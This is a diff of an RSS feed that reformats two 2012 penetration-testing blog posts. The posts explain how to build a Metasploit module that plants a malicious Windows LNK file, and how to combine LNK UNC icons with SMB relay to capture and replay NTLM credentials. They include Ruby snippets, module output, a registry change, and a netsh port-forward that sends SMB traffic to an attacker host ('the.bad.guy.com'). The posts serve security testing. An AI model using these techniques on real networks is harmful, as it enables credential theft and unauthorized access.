@@ -16,66 +16,37 @@
       <pubDate>Sun, 19 Feb 2012 05:57:02 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</guid>
-      <description>&lt;p&gt;I have been using the LNK trick I talked about in my &lt;a href=&#34;https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018&#34;&gt;last post&lt;/a&gt; for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target.&lt;/p&gt;
-
-&lt;p&gt;Of course the first place I looked was Meterpreter&amp;rsquo;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa969393.aspx&#34;&gt;work with COM objects&lt;/a&gt;. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx&#34;&gt;using the spec&lt;/a&gt;.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz&lt;/p&gt;
-
+      <description>&lt;p&gt;I have been using the LNK trick I talked about in my &lt;a href=&#34;https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018&#34;&gt;last post&lt;/a&gt; for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&#39;s target.&lt;/p&gt;
+&lt;p&gt;Of course the first place I looked was Meterpreter&#39;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa969393.aspx&#34;&gt;work with COM objects&lt;/a&gt;. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx&#34;&gt;using the spec&lt;/a&gt;.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz&lt;/p&gt;
 &lt;p&gt;Enter &lt;a href=&#34;http://redmine.corelan.be/projects/mona&#34;&gt;mona&lt;/a&gt;, the &lt;a href=&#34;http://www.corelan.be/&#34;&gt;Corelan Team’s&lt;/a&gt; exploit development plugin for &lt;a href=&#34;http://immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.&lt;/p&gt;
-
 &lt;p&gt;We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued:&lt;/p&gt;
-
 &lt;p&gt;&lt;code&gt;“!mona header C:\autoexec.lnk”&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;header &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;C:\%\\\\192.168.100.100\\w00t\\bogusimage.png`&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;header &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_unicode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;C:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;192.168.100.100&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w00t&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bogusimage.png`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.&lt;/p&gt;
 &lt;p&gt;Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?&lt;/p&gt;
-
 &lt;p&gt;Now I have 3 challenges:&lt;/p&gt;
-
 &lt;ol&gt;
 &lt;li&gt;It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.&lt;/li&gt;
 &lt;li&gt;It needs to upload the file to the exploited system.&lt;/li&gt;
 &lt;li&gt;It needs to be up to code on the Metasploit coding standards&lt;/li&gt;
 &lt;/ol&gt;
-
 &lt;p&gt;Changing the line I found for the share name into this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;lnk &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;\\\\#{datastore[&#39;LHOST&#39;]}\\#{datastore[&#39;SHARENAME&#39;]}\\#{datastore[&#39;ICONFILENAME&#39;]}`&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;OptAddressRange.new(&amp;quot;LHOST&amp;quot;, [ true, &amp;quot;Host listening for incoming SMB/WebDAV traffic&amp;quot;, nil]),
-OptString.new(&amp;quot;SHARENAME&amp;quot;, [ true, &amp;quot;Share name on LHOST&amp;quot;, &amp;quot;share1&amp;quot;]),       
-OptString.new(&amp;quot;ICONFILENAME&amp;quot;, [ true, &amp;quot;File name on LHOST&#39;s share&amp;quot;, &amp;quot;icon.png&amp;quot;])
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;lnk &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_unicode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LHOST&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SHARENAME&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ICONFILENAME&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;OptAddressRange&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LHOST&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host listening for incoming SMB/WebDAV traffic&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;),
+&lt;span style=&#34;color:#66d9ef&#34;&gt;OptString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SHARENAME&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Share name on LHOST&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;share1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;),       
+&lt;span style=&#34;color:#66d9ef&#34;&gt;OptString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ICONFILENAME&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;File name on LHOST&amp;#39;s share&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;icon.png&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.&lt;/p&gt;
 &lt;p&gt;Problem 1 solved. Problem 2 was just as easy, the following line:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;file = client.fs.file.new(datastore[&#39;LNKFILENAME&#39;], &#39;wb&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.&lt;/p&gt;
 &lt;p&gt;Problem 3 is much more tricky, but here is the path to wisdom:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Hope this helps spur people into trying their hand at developing some modules of their own.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hope this helps spur people into trying their hand at developing some modules of their own.&lt;/p&gt;
 </description>
     </item>
     
@@ -85,42 +56,23 @@ OptString.new(&amp;quot;ICONFILENAME&amp;quot;, [ true, &amp;quot;File name on L
       <pubDate>Sat, 11 Feb 2012 08:29:37 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</guid>
-      <description>
-
-&lt;p&gt;*&lt;strong&gt;&lt;em&gt;TL;DR:&lt;/em&gt;&lt;/strong&gt;* SMB Relay + LNK UNC icons = internal pentest pwnage&lt;/p&gt;
-
+      <description>&lt;p&gt;&lt;strong&gt;&lt;strong&gt;TL;DR:&lt;/strong&gt;&lt;/strong&gt; SMB Relay + LNK UNC icons = internal pentest pwnage&lt;/p&gt;
 &lt;p&gt;I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;MS08_068:&lt;/strong&gt; &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2008-4037/&#34;&gt;http://www.cvedetails.com/cve/CVE-2008-4037/&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;In 2008, Microsoft released MS08_068 which patched the &amp;ldquo;SMB Relay&amp;rdquo; attack. To boil this down, an attacker gets a victim to attempt to authenticate to an attacker controlled box. The attack delays its responses to the victim and replays the important parts of the authentication that the victim sent back at the victim. You can find out a lot more about this vulnerability here: &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;One thing to take away from that post is that the patch stops Attacker &amp;lt;=&amp;gt; Victim, but does not / cannot fix Victim &amp;lt;=&amp;gt; Attacker &amp;lt;=&amp;gt; &lt;strong&gt;Victim2&lt;/strong&gt; (use authentication from Victim to replay to Victim2)&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;MS10_046:&lt;/strong&gt; &lt;a href=&#34;http://www.cvedetails.com/cve/CVE-2010-2568/&#34;&gt;http://www.cvedetails.com/cve/CVE-2010-2568/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut&amp;rsquo;s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the &amp;lsquo;Change Icon&amp;rsquo; button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-)&lt;/p&gt;
-
+&lt;p&gt;In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut&#39;s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the &amp;lsquo;Change Icon&amp;rsquo; button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-)&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;The Setup:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine&amp;rsquo;s IP and use SMB_Relay to replay those credentials to a system in which we&amp;rsquo;ve identified by one means or another as an &amp;lsquo;important&amp;rsquo; host to get on.&lt;/p&gt;
-
+&lt;p&gt;If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine&#39;s IP and use SMB_Relay to replay those credentials to a system in which we&#39;ve identified by one means or another as an &amp;lsquo;important&amp;rsquo; host to get on.&lt;/p&gt;
 &lt;p&gt;Attacker uploads malicious LNK file to network share on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;
-
 &lt;p&gt;Victim views it on &lt;strong&gt;WORKSTATION&lt;/strong&gt; that initiates an connection to &lt;strong&gt;ATTACKER&lt;/strong&gt;&lt;/p&gt;
-
 &lt;p&gt;Attacker relays those authentication attempts to &lt;strong&gt;FILE SHARE&lt;/strong&gt;, gaining code execution if &amp;lsquo;Victim&amp;rsquo; is an admin on &lt;strong&gt;FILE SHARE&lt;/strong&gt;&lt;/p&gt;
-
 &lt;p&gt;If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.&lt;/p&gt;
-
 &lt;p&gt;Your mileage will vary based on where you put the LNK file.&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;The Video:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;center&gt;&lt;iframe align=center width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/FxekUPY5ojU&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
-
-&lt;p&gt;I have created a post module to automate the process of creating and uploading the LNK file (so you don&amp;rsquo;t have to have a Windows box lying around). Here it is in action:&lt;/p&gt;
-
+&lt;center&gt;&lt;iframe align=center width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/FxekUPY5ojU&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;
+&lt;p&gt;I have created a post module to automate the process of creating and uploading the LNK file (so you don&#39;t have to have a Windows box lying around). Here it is in action:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Module options (post/windows/escalate/droplnk):
 
    Name          Current Setting  Required  Description
@@ -137,54 +89,40 @@ OptString.new(&amp;quot;ICONFILENAME&amp;quot;, [ true, &amp;quot;File name on L
 [*] Done. Writing to disk - C:\DocuMe~1\Administrator\Words.lnk
 [*] Done. Wait for evil to happen..
 [*] Post module execution completed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;You can find the code here:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You can find the code here:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&#34;&gt;https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;Going forward:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Obviously this isn&amp;rsquo;t so effective remotely out of the box and there currently isn&amp;rsquo;t a SMB_Relay for WebDAV (although I&amp;rsquo;m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host:&lt;/p&gt;
-
+&lt;p&gt;Obviously this isn&#39;t so effective remotely out of the box and there currently isn&#39;t a SMB_Relay for WebDAV (although I&#39;m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Step 1&lt;/strong&gt;: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect and can be done using the following command:&lt;br /&gt;
-
+&lt;li&gt;&lt;strong&gt;Step 1&lt;/strong&gt;: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect and can be done using the following command:
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;reg add HKLM\System\CurrentControlSet\Services\NetBTParameters /v SMBDeviceEnabled /t REG_DWORD /d 0&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Step 2&lt;/strong&gt;: Port forward the traffic out to your remote attacker host over a port that is allowed out, used 80:
-
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;netsh int portproxy v4tov4 listenport=445 connectaddress=the.bad.guy.com connectport=80&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Step 3&lt;/strong&gt;: Set up SMB_Relay listening on that port on your attacker with a route in meterpreter to send all relayed authentication through your meterpreter session into and at the targeted host.&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;p&gt;These steps can get you noticed in almost every way, so it&amp;rsquo;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)&lt;/p&gt;
-
-&lt;p&gt;The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&amp;rsquo;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.&lt;/p&gt;
-
+&lt;p&gt;These steps can get you noticed in almost every way, so it&#39;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)&lt;/p&gt;
+&lt;p&gt;The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&#39;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.&lt;/p&gt;
 &lt;p&gt;just saying&amp;rsquo;…. /me nudges the Metasploit devs…&lt;/p&gt;
-
 &lt;h3 id=&#34;references&#34;&gt;References:&lt;/h3&gt;
-
 &lt;h4 id=&#34;smb-relay-references&#34;&gt;SMB_Relay References:&lt;/h4&gt;
-
 &lt;ul&gt;
 &lt;li&gt;&amp;ldquo;Initial?&amp;rdquo; release in 2003 - &lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;http://www.xfocus.net/articles/200305/smbrelay.html&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&#34;&gt;http://technet.microsoft.com/en-us/security/bulletin/ms08-068&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&#34;&gt;http://www.metasploit.com/modules/exploit/windows/smb/smb_relay&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;h4 id=&#34;lnk-dll-loader-references&#34;&gt;LNK DLL Loader References:&lt;/h4&gt;
-
 &lt;ul&gt;
 &lt;li&gt;Microsoft advisory - &lt;a href=&#34;http://technet.microsoft.com/en-us/security/advisory/2286198&#34;&gt;http://technet.microsoft.com/en-us/security/advisory/2286198&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Metasploit blog post - &lt;a href=&#34;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&#34;&gt;https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Some of HDM&amp;rsquo;s research - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;ISS&amp;rsquo;s advisory - &lt;a href=&#34;http://blogs.iss.net/archive/remotedllpreloadingv.html&#34;&gt;http://blogs.iss.net/archive/remotedllpreloadingv.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Some of HDM&#39;s research - &lt;a href=&#34;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&#34;&gt;https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;ISS&#39;s advisory - &lt;a href=&#34;http://blogs.iss.net/archive/remotedllpreloadingv.html&#34;&gt;http://blogs.iss.net/archive/remotedllpreloadingv.html&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Metasploit module - &lt;a href=&#34;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&#34;&gt;http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Video of the module in action - &lt;a href=&#34;http://www.commonexploits.com/?p=151&#34;&gt;http://www.commonexploits.com/?p=151&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
